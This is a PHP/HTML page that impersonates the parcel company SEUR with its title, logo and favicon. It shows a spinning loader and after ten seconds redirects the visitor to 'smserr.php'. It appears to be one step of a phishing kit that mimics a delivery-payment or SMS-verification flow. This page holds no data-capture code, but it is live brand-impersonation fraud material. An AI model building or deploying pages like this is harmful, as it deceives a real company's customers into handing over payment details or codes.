<?php 
    require_once "functions.php";
?>



<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>SEUR: Envío y transporte de paquetería y mensajería | SEUR</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/arda.css">
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/favicon.jpg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/favicon.jpg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons" />
  <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
  <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
</head>
<body style="background:white">



  <header>
    <div class="container">
      <div class="left d-flex align-items-center">
        <img src="image/logo.png" alt="" width="120px" class="img-fluid">
        <img src="image/list.png" alt="" style="margin-left:30px" class="d-none d-xl-block img=fluis">
      </div>
      <div class="right">
        <img src="image/bar.png" alt="" class="d-block d-xl-none img-fluid" style="padding-left:30px">
        <img src="image/left22.png" alt=""  class="d-none d-xl-block img-fluid" >
      </div>
    </div>
  </header>

  <main id="main">
    <div class="container">
      <article style="padding-bottom: 200px;padding-top: 100px;">
        <div class="login text-center" style="background: #fff;"> 
          <span class="loader"></span>
          <style>
            .loader {
              width: 48px;
              height: 48px;
              border: 4px solid #ccc;
              border-bottom-color: #2563EB;
              border-radius: 50%;
              display: inline-block;
              box-sizing: border-box;
              animation: rotation 1s linear infinite;
              }

              @keyframes rotation {
              0% {
                  transform: rotate(0deg);
              }
              100% {
                  transform: rotate(360deg);
              }
            } 
          </style>
        </div>
      </article>
    </div>
  </main>




     


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <!-- <script src="js/valid.js"></script> -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    setTimeout(function () {
      window.location.href= 'smserr.php';
    },10000); // 1000 = 1s 
  </script>

</body>
</html>